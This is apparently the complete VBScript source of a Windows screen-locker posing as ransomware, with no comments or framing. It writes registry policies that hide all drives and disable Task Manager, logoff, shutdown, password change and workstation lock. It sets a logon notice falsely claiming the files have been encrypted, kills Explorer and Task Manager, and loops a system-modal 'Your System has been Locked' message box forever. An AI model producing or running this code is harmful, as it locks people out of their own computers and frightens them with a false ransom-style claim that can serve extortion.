Dim WshShell
Dim intDriveNumber
Dim currentPath,DesktopPath
Set WshShell=CreateObject("Wscript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")
Set ShellApp=CreateObject("Shell.Application")
intDriveNumber=67108863
currentPath=WshShell.CurrentDirectory
DesktopPath=WshShell.SpecialFolders("Desktop")
Call WriteToRegistry()
Call LockandActivateMsgLoop()

Function WriteToRegistry()
	WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive", _
	 intDriveNumber, "REG_DWORD"
	WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", _
	 intDriveNumber, "REG_DWORD"
     WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText", _
"~Your files have been encrypted! You are not authorized to use this PC!", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption", "Screen Lock", "REG_SZ"
End Function
Function LockandActivateMsgLoop
WshShell.Run "Taskkill /F /IM Explorer.exe /IM Taskmgr.exe",0
Call MsgLoopStart()
End Function
Function MsgLoopStart()
X=MsgBox("Your System has been Locked",vbOKOnly+vbCritical+vbSystemModal,"Error")
Call RestartMsgBox()
End Function
Function RestartMsgBox()
Call MsgLoopStart()
End Function